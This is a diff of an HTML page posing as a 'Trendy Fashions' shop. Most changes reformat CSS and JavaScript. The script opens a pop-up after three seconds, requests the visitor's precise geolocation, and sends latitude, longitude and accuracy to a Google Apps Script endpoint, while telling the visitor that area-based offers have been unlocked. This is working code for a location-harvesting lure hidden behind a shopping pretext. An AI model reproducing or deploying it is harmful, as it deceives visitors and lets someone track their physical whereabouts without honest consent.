@@ -3,63 +3,21 @@
 <head>
   <title>Trendy Fashions</title>
   <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f8f9fa;
-      margin: 0;
-      padding: 0;
-    }
-    header {
-      background-color: #e91e63;
-      color: white;
-      padding: 15px;
-      text-align: center;
-      font-size: 24px;
-    }
-    .products {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 15px;
-      padding: 20px;
-    }
-    .product {
-      background-color: white;
-      padding: 10px;
-      border-radius: 10px;
-      box-shadow: 0 0 8px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    .product img {
-      width: 100%;
-      border-radius: 10px;
-    }
+    body { font-family: 'Segoe UI', sans-serif; background-color: #f8f9fa; margin:0; padding:0; }
+    header { background-color: #e91e63; color: white; padding: 15px; text-align: center; font-size: 24px; }
+    .products { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; }
+    .product { background: white; padding: 10px; border-radius: 10px; box-shadow: 0 0 8px rgba(0,0,0,0.1); text-align: center; }
+    .product img { width: 100%; border-radius: 10px; }
     .modal {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6);
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
+      display: none; position: fixed; top:0; left:0; width: 100%; height: 100%; background: rgba(0,0,0,0.6);
+      justify-content: center; align-items: center; z-index: 999;
     }
     .modal-content {
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      text-align: center;
-      max-width: 300px;
+      background: white; padding: 30px; border-radius: 12px; text-align: center; max-width: 300px;
     }
-    .modal-content h3 {
-      margin-bottom: 10px;
-    }
+    .modal-content h3 { margin-bottom: 10px; }
     .modal-content button {
-      background-color: #e91e63;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
+      background-color: #e91e63; color: white; padding: 10px 20px; border:none; border-radius:6px; cursor:pointer;
     }
   </style>
 </head>
@@ -96,7 +54,6 @@
 </div>
 
 <script>
-  // Show modal after 3 seconds
   setTimeout(() => {
     document.getElementById("locationModal").style.display = "flex";
   }, 3000);
@@ -107,30 +64,30 @@
       return;
     }
 
-    navigator.geolocation.getCurrentPosition(function(position) {
-      const data = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy
-      };
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const data = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        };
 
-      fetch("https://script.google.com/macros/s/AKfycby9gjhdzroN5DiCEA1MkgXTsdPhNjpQzM7Fr3B0Cyqcu2UtRr9vWNIFNZG9JVxNve0A/exec", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data),
-        mode: "no-cors"
-      })
-      .then(() => {
-        alert("✅ Offers unlocked based on your area!");
-        document.getElementById("locationModal").style.display = "none";
-      })
-      .catch(() => {
-        alert("Failed to send location.");
-      });
-
-    }, function() {
-      alert('❌ Permission denied or error.');
-    });
+        fetch("https://script.google.com/macros/s/AKfycby9gjhdzroN5DiCEA1MkgXTsdPhNjpQzM7Fr3B0Cyqcu2UtRr9vWNIFNZG9JVxNve0A/exec", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+          mode: "no-cors"
+        })
+        .then(() => {
+          alert("✅ Offers unlocked based on your area!");
+          document.getElementById("locationModal").style.display = "none";
+        })
+        .catch(() => {
+          alert("Failed to send location.");
+        });
+      },
+      () => alert('❌ Permission denied or error.')
+    );
   }
 </script>
 
